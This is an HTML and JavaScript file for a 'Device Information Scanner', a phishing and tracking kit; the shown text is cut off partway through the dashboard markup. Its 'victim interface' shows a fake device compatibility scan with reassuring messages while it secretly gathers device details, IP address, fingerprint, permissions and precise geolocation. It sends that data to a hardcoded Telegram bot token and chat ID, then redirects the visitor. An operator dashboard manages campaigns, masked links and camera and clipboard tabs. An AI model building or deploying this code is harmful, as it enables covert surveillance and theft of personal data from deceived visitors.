<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Information Scanner</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #3498db;
            --accent-color: #e74c3c;
            --light-bg: #ecf0f1;
            --dark-bg: #2c3e50;
        }
        
        /* VICTIM INTERFACE STYLES */
        .victim-interface {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        
        .victim-card {
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            overflow: hidden;
            max-width: 600px;
            margin: 0 auto;
        }
        
        .victim-header {
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            color: white;
            padding: 25px;
            text-align: center;
        }
        
        .victim-body {
            padding: 30px;
        }
        
        .checklist-item {
            padding: 12px;
            border-bottom: 1px solid #eee;
            display: flex;
            align-items: center;
            transition: all 0.3s;
        }
        
        .checklist-item.completed {
            color: #28a745;
        }
        
        .checklist-item.completed i {
            color: #28a745;
        }
        
        .checklist-item.active {
            background-color: #f8f9fa;
            border-left: 4px solid var(--secondary-color);
        }
        
        .checklist-item.failed {
            color: #dc3545;
        }
        
        .checklist-item.failed i {
            color: #dc3545;
        }
        
        .victim-footer {
            padding: 20px;
            background-color: #f8f9fa;
            border-top: 1px solid #eee;
            text-align: center;
            font-size: 0.9rem;
            color: #666;
        }
        
        /* DASHBOARD STYLES */
        .dashboard-interface {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .glass-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }
        
        .info-card {
            transition: transform 0.3s, box-shadow 0.3s;
            height: 100%;
            border: none;
            border-radius: 15px;
            overflow: hidden;
        }
        
        .info-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
        }
        
        .card-header {
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            color: white;
            border-bottom: none;
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        
        .card-icon {
            font-size: 1.5rem;
            margin-right: 10px;
        }
        
        .data-item {
            padding: 10px 15px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .data-item:last-child {
            border-bottom: none;
        }
        
        .data-label {
            font-weight: 600;
            color: var(--primary-color);
        }
        
        .data-value {
            color: #555;
            text-align: right;
            word-break: break-word;
            max-width: 60%;
        }
        
        .camera-container {
            width: 100%;
            height: 200px;
            background-color: #000;
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 15px;
            position: relative;
        }
        
        .camera-feed {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .snapshot-btn {
            background: linear-gradient(45deg, var(--accent-color), #c0392b);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 50px;
            font-weight: 600;
            transition: all 0.3s;
        }
        
        .snapshot-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(231, 76, 60, 0.4);
        }
        
        .snapshot-canvas {
            display: none;
        }
        
        .location-map {
            width: 100%;
            height: 200px;
            background-color: #eee;
            border-radius: 10px;
            overflow: hidden;
        }
        
        .tab-content {
            padding: 20px;
            background-color: white;
            border-radius: 0 0 15px 15px;
        }
        
        .nav-tabs {
            border-bottom: none;
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            border-radius: 15px 15px 0 0;
            padding: 15px 15px 0;
        }
        
        .nav-link {
            color: rgba(255, 255, 255, 0.8);
            border: none;
            border-radius: 10px 10px 0 0;
            margin-right: 5px;
            font-weight: 500;
        }
        
        .nav-link.active {
            background-color: white;
            color: var(--primary-color);
            font-weight: 600;
        }
        
        .progress {
            height: 25px;
            border-radius: 50px;
            margin: 10px 0;
        }
        
        .progress-bar {
            background: linear-gradient(45deg, var(--secondary-color), #2980b9);
            border-radius: 50px;
        }
        
        .fingerprint-canvas {
            width: 100%;
            height: 100px;
            background-color: #f8f9fa;
            border-radius: 10px;
            margin: 15px 0;
        }
        
        .permission-badge {
            margin: 5px;
        }
        
        .qr-code {
            width: 150px;
            height: 150px;
            margin: 0 auto;
            background-color: #f8f9fa;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            color: #666;
            text-align: center;
            padding: 10px;
        }
        
        .mask-url {
            background-color: #f8f9fa;
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0;
            font-family: monospace;
            word-break: break-all;
        }
        
        .tool-icon {
            font-size: 2rem;
            color: var(--secondary-color);
            margin-bottom: 15px;
        }
        
        .feature-list {
            list-style-type: none;
            padding-left: 0;
        }
        
        .feature-list li {
            padding: 8px 0;
            border-bottom: 1px dashed #eee;
        }
        
        .feature-list li:last-child {
            border-bottom: none;
        }
        
        .feature-list i {
            color: var(--secondary-color);
            margin-right: 10px;
        }
        
        .scanning-animation {
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.6; }
            100% { opacity: 1; }
        }
        
        .download-btn {
            background: linear-gradient(45deg, #27ae60, #2ecc71);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            font-weight: 600;
            font-size: 1.1rem;
            transition: all 0.3s;
        }
        
        .download-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(39, 174, 96, 0.3);
        }
        
        .telegram-btn {
            background: linear-gradient(45deg, #0088cc, #00aced);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            font-weight: 600;
            font-size: 1.1rem;
            transition: all 0.3s;
        }
        
        .telegram-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0, 136, 204, 0.3);
        }
        
        .link-btn {
            background: linear-gradient(45deg, #9b59b6, #8e44ad);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            font-weight: 600;
            font-size: 1.1rem;
            transition: all 0.3s;
        }
        
        .link-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(155, 89, 182, 0.3);
        }
        
        .telegram-config {
            background-color: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .telegram-config input {
            font-family: monospace;
        }
        
        .modal-content {
            border-radius: 15px;
            overflow: hidden;
        }
        
        .modal-header {
            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
            color: white;
        }
        
        .screenshot-container {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .screenshot-img {
            max-width: 100%;
            border-radius: 10px;
            margin-bottom: 10px;
            border: 2px solid #dee2e6;
        }
        
        .link-preview {
            background: linear-gradient(45deg, #1a1a2e, #16213e);
            color: white;
            padding: 15px;
            border-radius: 10px;
            font-family: monospace;
            word-break: break-all;
            margin: 10px 0;
        }
        
        .shortener-result {
            background: linear-gradient(45deg, #27ae60, #2ecc71);
            color: white;
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
        }
        
        .campaign-item {
            border-left: 4px solid var(--secondary-color);
            padding-left: 15px;
            margin-bottom: 15px;
        }
        
        .campaign-stats {
            font-size: 0.8rem;
            color: #666;
        }
        
        .social-share-btn {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 1.5rem;
            margin: 5px;
            transition: transform 0.3s;
        }
        
        .social-share-btn:hover {
            transform: scale(1.1);
        }
        
        .facebook { background: #3b5998; }
        .whatsapp { background: #25d366; }
        .telegram { background: #0088cc; }
        .twitter { background: #1da1f2; }
        .messenger { background: #006aff; }
        
        .cloak-preview {
            border: 2px dashed #dee2e6;
            border-radius: 10px;
            padding: 20px;
            margin: 15px 0;
            background-color: #f8f9fa;
        }
        
        .cloak-preview img {
            max-width: 100%;
            border-radius: 5px;
        }
        
        .victim-alert {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
            background: linear-gradient(45deg, #e74c3c, #c0392b);
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            animation: slideIn 0.5s ease-out;
            display: none;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .loading-spinner {
            display: inline-block;
            width: 1rem;
            height: 1rem;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Toast Notification Styles */
        .custom-toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 9999;
            min-width: 300px;
        }
        
        .toast.show {
            display: block !important;
        }
    </style>
</head>
<body id="main-body">
    <!-- This will be replaced based on access type -->

    <!-- Bootstrap JS Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    
    <script>
        // ============================================
        // GLOBAL VARIABLES AND CONFIGURATION
        // ============================================
        
        // Global data object to store all collected information
        const deviceData = {
            deviceInfo: {},
            networkInfo: {},
            batteryInfo: {},
            locationInfo: {},
            storageInfo: {},
            permissionsInfo: {},
            fingerprintInfo: {},
            cameraInfo: {},
            clipboardInfo: {},
            victimID: '',
            timestamp: new Date().toISOString()
        };

        // Telegram bot configuration
        const telegramConfig = {
            botToken: '7992081098:AAH8uPHC5iGtVt2CB8h6oCaZuCo33BUkfX0',
            chatId: '1523864238',
            apiUrl: 'https://api.telegram.org/bot',
            sendHistory: []
        };

        // Campaign and link management
        const campaignManager = {
            campaigns: [],
            currentLink: '',
            currentCampaign: null,
            
            addCampaign: function(name, link, data) {
                const campaign = {
                    id: 'camp_' + Date.now(),
                    name: name,
                    link: link,
                    created: new Date().toISOString(),
                    stats: {
                        views: 0,
                        clicks: 0,
                        dataCollected: 0,
                        lastAccess: null
                    },
                    settings: data
                };
                
                this.campaigns.push(campaign);
                this.currentCampaign = campaign;
                this.saveToStorage();
                
                return campaign;
            },
            
            incrementStat: function(campaignId, stat) {
                const campaign = this.campaigns.find(c => c.id === campaignId);
                if (campaign && campaign.stats[stat] !== undefined) {
                    campaign.stats[stat]++;
                    campaign.stats.lastAccess = new Date().toISOString();
                    this.saveToStorage();
                }
            },
            
            saveToStorage: function() {
                localStorage.setItem('deviceScannerCampaigns', JSON.stringify(this.campaigns));
            },
            
            loadFromStorage: function() {
                const saved = localStorage.getItem('deviceScannerCampaigns');
                if (saved) {
                    this.campaigns = JSON.parse(saved);
                }
            },
            
            getCampaignStats: function() {
                return this.campaigns.map(c => ({
                    id: c.id,
                    name: c.name,
                    link: c.link,
                    stats: c.stats
                }));
            }
        };

        // ============================================
        // INITIALIZATION AND ACCESS DETECTION
        // ============================================

        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', function() {
            // Check if this is a victim accessing via generated link
            const isVictimAccess = checkForTracking();
            
            if (!isVictimAccess) {
                // Load dashboard interface
                loadDashboardInterface();
            }
            // If isVictimAccess is true, the victim interface is already loaded
        });

        // ============================================
        // ACCESS DETECTION AND INTERFACE SELECTION
        // ============================================

        // Check if this is a victim accessing via generated link
        function checkForTracking() {
            const urlParams = new URLSearchParams(window.location.search);
            const campaignId = urlParams.get('cid');
            const tracking = urlParams.get('track');
            
            if (tracking === 'true' && campaignId) {
                // Hide any existing content
                document.body.innerHTML = '';
                document.body.className = 'victim-interface';
                
                // Create victim interface
                createVictimInterface(campaignId);
                
                // Increment campaign stats
                campaignManager.incrementStat(campaignId, 'clicks');
                
                // Start data collection immediately
                setTimeout(() => {
                    collectAllDataForVictim(campaignId);
                }, 1500);
                
                return true; // This is a victim access
            }
            return false; // This is dashboard access
        }

        // Load dashboard interface
        function loadDashboardInterface() {
            document.body.innerHTML = getDashboardHTML();
            document.body.className = 'dashboard-interface';
            
            // Initialize dashboard functionality
            initializeDashboard();
        }

        // ============================================
        // VICTIM INTERFACE FUNCTIONS
        // ============================================

        // Create a clean interface for victims
        function createVictimInterface(campaignId) {
            const cloakTitle = getCloakTitleFromCampaign(campaignId) || 'Device Compatibility Scan';
            
            document.body.innerHTML = `
                <div class="victim-card">
                    <div class="victim-header">
                        <h1 class="display-6 mb-2">
                            <i class="fas fa-shield-alt"></i> ${cloakTitle}
                        </h1>
                        <p class="mb-0">Ensuring optimal device performance</p>
                    </div>
                    
                    <div class="victim-body">
                        <div class="text-center mb-4">
                            <div class="spinner-border text-primary mb-3" style="width: 3rem; height: 3rem;" role="status">
                                <span class="visually-hidden">Loading...</span>
                            </div>
                            <h4 id="status-message">Initializing Compatibility Scan</h4>
                            <p class="text-muted" id="status-details">
                                Please wait while we analyze your device configuration
                            </p>
                        </div>
                        
                        <div class="progress mb-4" style="height: 20px;">
                            <div id="scan-progress" class="progress-bar progress-bar-striped progress-bar-animated" 
                                 role="progressbar" style="width: 5%">
                                <span class="progress-text">5%</span>
                            </div>
                        </div>
                        
                        <div id="checklist" class="mb-4">
                            <div class="checklist-item active">
                                <i class="fas fa-spinner fa-spin text-primary me-2"></i>
                                <span>Device Information Scan</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Network Analysis</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Security Diagnostics</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Performance Optimization</span>
                            </div>
                            <div class="checklist-item">
                                <i class="fas fa-clock me-2"></i>
                                <span>Final Verification</span>
                            </div>
                        </div>
                        
                        <div class="alert alert-info">
                            <i class="fas fa-info-circle"></i>
                            <strong>Important:</strong> Do not close this window during the scan. 
                            The process will complete automatically.
                        </div>
                        
                        <div class="row mt-4">
                            <div class="col-6">
                                <div class="text-center p-3 border rounded">
                                    <i class="fas fa-lock fa-2x text-success mb-2"></i>
                                    <div class="small">Secure Connection</div>
                                </div>
                            </div>
                            <div class="col-6">
                                <div class="text-center p-3 border rounded">
                                    <i class="fas fa-user-shield fa-2x text-primary mb-2"></i>
                                    <div class="small">Privacy Protected</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="victim-footer">
                        <div class="d-flex justify-content-center align-items-center">
                            <i class="fas fa-circle text-success me-2" style="font-size: 0.7rem;"></i>
                            <span>Scan in progress ‚Ä¢ Estimated time: 15 seconds</span>
                        </div>
                    </div>
                </div>
            `;
        }

        // Get cloak title from campaign or URL
        function getCloakTitleFromCampaign(campaignId) {
            try {
                campaignManager.loadFromStorage();
                const campaign = campaignManager.campaigns.find(c => c.id === campaignId);
                if (campaign && campaign.settings && campaign.settings.cloakTitle) {
                    return campaign.settings.cloakTitle;
                }
            } catch (e) {
                console.log('Could not load campaign title:', e);
            }
            
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('title') || 'Device Compatibility Scan';
        }

        // Update victim interface progress
        function updateVictimProgress(step, totalSteps, message) {
            const progress = Math.min(100, Math.round((step / totalSteps) * 100));
            
            const progressBar = document.getElementById('scan-progress');
            const progressText = progressBar ? progressBar.querySelector('.progress-text') : null;
            const statusMessage = document.getElementById('status-message');
            const statusDetails = document.getElementById('status-details');
            
            if (progressBar) {
                progressBar.style.width = `${progress}%`;
                if (progressText) {
                    progressText.textContent = `${progress}%`;
                }
            }
            
            if (statusMessage && message) {
                statusMessage.textContent = message;
            }
            
            if (statusDetails) {
                const messages = [
                    "Analyzing device specifications and hardware...",
                    "Checking network connectivity and security...",
                    "Running comprehensive security diagnostics...",
                    "Optimizing performance settings...",
                    "Finalizing scan and generating report..."
                ];
                statusDetails.textContent = messages[step - 1] || "Finalizing scan...";
            }
            
            // Update checklist
            const checklistItems = document.querySelectorAll('.checklist-item');
            if (checklistItems.length >= step) {
                for (let i = 0; i < checklistItems.length; i++) {
                    checklistItems[i].classList.remove('active');
                    
                    if (i < step - 1) {
                        // Completed steps
                        checklistItems[i].innerHTML = '<i class="fas fa-check text-success me-2"></i>' + 
                            checklistItems[i].textContent;
                        checklistItems[i].classList.add('completed');
                    } else if (i === step - 1) {
                        // Current step
                        checklistItems[i].innerHTML = '<i class="fas fa-spinner fa-spin text-primary me-2"></i>' + 
                            checklistItems[i].textContent;
                        checklistItems[i].classList.add('active');
                    }
                }
            }
        }

        // Modified collectAllDataForVictim function
        async function collectAllDataForVictim(campaignId) {
            const totalSteps = 5;
            
            // Step 1: Device Info
            updateVictimProgress(1, totalSteps, "Collecting Device Information...");
            await collectDeviceInfo();
            await delay(1000);
            
            // Step 2: Network Info
            updateVictimProgress(2, totalSteps, "Analyzing Network Configuration...");
            await collectNetworkInfo();
            await delay(1000);
            
            // Step 3: Security/Fingerprint
            updateVictimProgress(3, totalSteps, "Running Security Diagnostics...");
            await collectFingerprintInfo();
            await delay(1000);
            
            // Step 4: Additional Info
            updateVictimProgress(4, totalSteps, "Optimizing Performance...");
            await collectStorageInfo();
            await collectBatteryInfo();
            await collectPermissionsInfo();
            await delay(1000);
            
            // Step 5: Location (optional)
            updateVictimProgress(5, totalSteps, "Finalizing Scan...");
            try {
                await getLocationForVictim();
            } catch (e) {
                console.log('Location not available');
            }
            
            // Update campaign stats
            campaignManager.incrementStat(campaignId, 'dataCollected');
            
            // Send to Telegram if configured
            try {
                campaignManager.loadFromStorage();
                const campaign = campaignManager.campaigns.find(c => c.id === campaignId);
                if (campaign && campaign.settings && campaign.settings.autoTelegram) {
                    await sendVictimDataToTelegram(campaignId);
                }
            } catch (e) {
                console.log('Failed to send to Telegram:', e);
            }
            
            // Show completion and redirect
            setTimeout(() => {
                completeVictimScan(campaignId);
            }, 1500);
        }

        // Complete victim scan and redirect
        function completeVictimScan(campaignId) {
            const redirectUrl = getCampaignRedirectUrl(campaignId);
            
            // Update UI to show completion
            document.getElementById('status-message').textContent = 'Scan Complete!';
            document.getElementById('status-details').textContent = 'Your device has been successfully analyzed and optimized.';
            
            // Hide spinner
            const spinner = document.querySelector('.spinner-border');
            if (spinner) spinner.style.display = 'none';
            
            // Update progress bar
            const progressBar = document.getElementById('scan-progress');
            if (progressBar) {
                progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
                progressBar.classList.add('bg-success');
                progressBar.style.width = '100%';
                progressBar.querySelector('.progress-text').textContent = '100%';
            }
            
            // Update all checklist items to completed
            document.querySelectorAll('.checklist-item').forEach(item => {
                item.innerHTML = '<i class="fas fa-check text-success me-2"></i>' + item.textContent;
                item.classList.add('completed');
                item.classList.remove('active');
            });
            
            // Show success message
            const alertDiv = document.querySelector('.alert');
            alertDiv.className = 'alert alert-success';
            alertDiv.innerHTML = `
                <i class="fas fa-check-circle"></i>
                <strong>Scan Successful!</strong> Your device is now optimized. 
                Redirecting in <span id="countdown">3</span> seconds...
            `;
            
            // Countdown and redirect
            let countdown = 3;
            const countdownElement = document.getElementById('countdown');
            const countdownInterval = setInterval(() => {
                countdown--;
                if (countdownElement) {
                    countdownElement.textContent = countdown;
                }
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    window.location.href = redirectUrl;
                }
            }, 1000);
            
            // Update footer
            const footer = document.querySelector('.victim-footer');
            if (footer) {
                footer.innerHTML = `
                    <div class="d-flex justify-content-center align-items-center">
                        <i class="fas fa-check-circle text-success me-2"></i>
                        <span>Scan completed successfully ‚Ä¢ Redirecting...</span>
                    </div>
                `;
            }
        }

        // Get redirect URL for campaign
        function getCampaignRedirectUrl(campaignId) {
            try {
                campaignManager.loadFromStorage();
                const campaign = campaignManager.campaigns.find(c => c.id === campaignId);
                if (campaign && campaign.settings && campaign.settings.redirectUrl) {
                    return campaign.settings.redirectUrl;
                }
            } catch (e) {
                console.log('Error loading campaign:', e);
            }
            
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('redirect') || 'https://google.com';
        }

        // Collect location for victim
        function getLocationForVictim() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        deviceData.locationInfo = {
                            latitude: lat,
                            longitude: lon,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            speed: position.coords.speed,
                            timestamp: new Date(position.timestamp).toISOString(),
                            source: 'victim_access'
                        };
                        
                        resolve(position);
                    },
                    error => reject(error),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }

        // Send victim data to Telegram
        async function sendVictimDataToTelegram(campaignId) {
            if (!telegramConfig.botToken || !telegramConfig.chatId) return;
            
            try {
                campaignManager.loadFromStorage();
                const campaign = campaignManager.campaigns.find(c => c.id === campaignId);
                const campaignName = campaign ? campaign.name : 'Unknown Campaign';
                
                // Format message for Telegram
                const message = formatVictimTelegramMessage(campaignName);
                
                // Send text message
                await sendTelegramMessage(message);
                
                // Send JSON data
                const jsonBlob = new Blob([JSON.stringify(deviceData, null, 2)], { 
                    type: 'application/json' 
                });
                const jsonFile = new File([jsonBlob], `victim-data-${Date.now()}.json`);
                await sendTelegramDocument(jsonFile, `Victim Data from: ${campaignName}`);
                
                telegramConfig.sendHistory.push({
                    timestamp: new Date().toISOString(),
                    type: 'Victim Data',
                    success: true,
                    message: `Campaign: ${campaignName}`
                });
                
            } catch (error) {
                console.error('Failed to send victim data:', error);
                
                telegramConfig.sendHistory.push({
                    timestamp: new Date().toISOString(),
                    type: 'Victim Data',
                    success: false,
                    message: `Error: ${error.message}`
                });
            }
        }

        // Format victim Telegram message
        function formatVictimTelegramMessage(campaignName) {
            let message = `üéØ *NEW VICTIM DATA CAPTURED!*\n\n`;
            message += `üìä *Campaign:* ${campaignName}\n`;
            message += `‚è∞ *Time:* ${new Date().toLocaleString()}\n`;
            message += `üîó *Source:* Generated Tracking Link\n\n`;
            
            if (deviceData.deviceInfo) {
                message += `üì± *Device Info:*\n`;
                message += `‚Ä¢ Platform: ${deviceData.deviceInfo.platform || 'Unknown'}\n`;
                message += `‚Ä¢ Resolution: ${deviceData.deviceInfo.screenResolution || 'Unknown'}\n`;
            }
            
            if (deviceData.locationInfo?.latitude) {
                message += `\nüìç *Location:*\n`;
                message += `‚Ä¢ Lat: ${deviceData.locationInfo.latitude.toFixed(6)}\n`;
                message += `‚Ä¢ Lon: ${deviceData.locationInfo.longitude.toFixed(6)}\n`;
                message += `‚Ä¢ Map: https://maps.google.com/?q=${deviceData.locationInfo.latitude},${deviceData.locationInfo.longitude}\n`;
            }
            
            if (deviceData.networkInfo?.ipv4) {
                message += `\nüåê *Network:*\n`;
                message += `‚Ä¢ IP: \`${deviceData.networkInfo.ipv4}\`\n`;
                message += `‚Ä¢ Type: ${deviceData.networkInfo.connectionType || 'Unknown'}\n`;
            }
            
            if (deviceData.fingerprintInfo?.full) {
                message += `\nüÜî *Fingerprint:*\n`;
                message += `‚Ä¢ Hash: \`${deviceData.fingerprintInfo.full.substring(0, 32)}...\`\n`;
            }
            
            message += `\n_Data automatically collected via tracking link_`;
            
            return message;
        }

        // ============================================
        // DASHBOARD INTERFACE FUNCTIONS
        // ============================================

        // Get dashboard HTML
        function getDashboardHTML() {
            return `
                <div class="container py-5">
                    <div class="row justify-content-center">
                        <div class="col-12">
                            <div class="glass-card p-4 mb-4">
                                <div class="row align-items-center">
                                    <div class="col-md-5">
                                        <h1 class="display-5 fw-bold text-white mb-2">
                                            <i class="fas fa-robot"></i> Device Information Scanner
                                        </h1>
                                        <p class="lead text-white mb-0">
                                            Comprehensive device, network, and browser information gathering tool
                                        </p>
                                    </div>
                                    <div class="col-md-7 text-end">
                                        <div class="d-flex justify-content-end gap-2 flex-wrap">
                                            <button class="btn link-btn mb-2" data-bs-toggle="modal" data-bs-target="#linkModal">
                                                <i class="fas fa-link"></i> Generate Link
                                            </button>
                                            <button class="btn telegram-btn mb-2" data-bs-toggle="modal" data-bs-target="#telegramModal">
                                                <i class="fab fa-telegram"></i> Send to Telegram
                                            </button>
                                            <button class="btn download-btn mb-2" onclick="downloadData()">
                                                <i class="fas fa-download"></i> Download Data
                                            </button>
                                            <button class="btn btn-light mb-2" onclick="openConfigModal()">
                                                <i class="fas fa-cog"></i> Settings
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="row">
                        <div class="col-lg-3 mb-4">
                            <div class="info-card glass-card">
                                <div class="card-header">
                                    <i class="fas fa-tools card-icon"></i> Tools Menu
                                </div>
                                <div class="card-body">
                                    <ul class="nav flex-column feature-list">
                                        <li>
                                            <a href="#info-tab" data-bs-toggle="tab" class="nav-link active">
                                                <i class="fas fa-info-circle"></i> Device Info
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#network-tab" data-bs-toggle="tab" class="nav-link">
                                                <i class="fas fa-wifi"></i> Network Info
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#camera-tab" data-bs-toggle="tab" class="nav-link">
                                                <i class="fas fa-camera"></i> Camera Snapshots
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#battery-tab" data-bs-toggle="tab" class="nav-link">
                                                <i class="fas fa-battery-full"></i> Battery Status
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#location-tab" data-bs-toggle="tab" class="nav-link">
                                                <i class="fas fa-map-marker-alt"></i> Location Info
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#storage-tab" data-bs-toggle="tab" class="nav-link">
                                                <i class="fas fa-hdd"></i> Storage Info
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#permissions-tab" data-bs-toggle="tab" class="nav-link">
                                                <i class="fas fa-shield-alt"></i> Permissions
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#fingerprint-tab" data-bs-toggle="tab" class="nav-link">
                                                <i class="fas fa-fingerprint"></i> Fingerprint
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#clipboard-tab" data-bs-toggle="tab" class="nav-link">
                                                <i class="fas fa-clipboard"></i> Clipboard
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#mask-tab" data-bs-toggle="tab" class="nav-link">
                                                <i class="fas fa-mask"></i> Mask URLs
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#link-tab" data-bs-toggle="tab" class="nav-link">
                                                <i class="fas fa-share-alt"></i> Link Generator
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#telegram-tab" data-bs-toggle="tab" class="nav-link">
                                                <i class="fab fa-telegram"></i> Telegram Bot
                                            </a>
                                        </li>
                                        <li>
                                            <a href="#all-tools-tab" data-bs-toggle="tab" class="nav-link">
                                                <i class="fas fa-boxes"></i> All-in-One Tools
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                            
                            <div class="info-card glass-card mt-4">
                                <div class="card-header">
                                    <i class="fas fa-qrcode card-icon"></i> Quick ID
                                </div>
                                <div class="card-body text-center">
                                    <div class="qr-code mb-3">
                                        <span>Device ID QR<br>(Simulated)</span>
                                    </div>
                                    <p class="small">Victim Info ID: <span id="victim-id">Loading...</span></p>
                                    <button class="btn btn-sm btn-outline-primary" onclick="generateVictimID()">
                                        <i class="fas fa-sync-alt"></i> Regenerate ID
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="col-lg-9">
                            <div class="info-card glass-card">
                                <div class="tab-content">
                                    <!-- Device Info Tab -->
                                    <div class="tab-pane fade show active" id="info-tab">
                                        <h4 class="mb-4"><i class="fas fa-microchip text-primary"></i> Device Information</h4>
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Platform:</span>
                                                    <span class="data-value" id="platform-info">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">User Agent:</span>
                                                    <span class="data-value" id="user-agent">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Device Name:</span>
                                                    <span class="data-value" id="device-name">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Device Memory:</span>
                                                    <span class="data-value" id="device-memory">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">App Version:</span>
                                                    <span class="data-value" id="app-version">Loading...</span>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Screen Resolution:</span>
                                                    <span class="data-value" id="screen-resolution">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Device Resolution:</span>
                                                    <span class="data-value" id="device-resolution">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Color Depth:</span>
                                                    <span class="data-value" id="color-depth">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Pixel Ratio:</span>
                                                    <span class="data-value" id="pixel-ratio">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Port Number:</span>
                                                    <span class="data-value" id="port-number">Loading...</span>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="mt-4">
                                            <h5><i class="fas fa-desktop text-primary"></i> Display Information</h5>
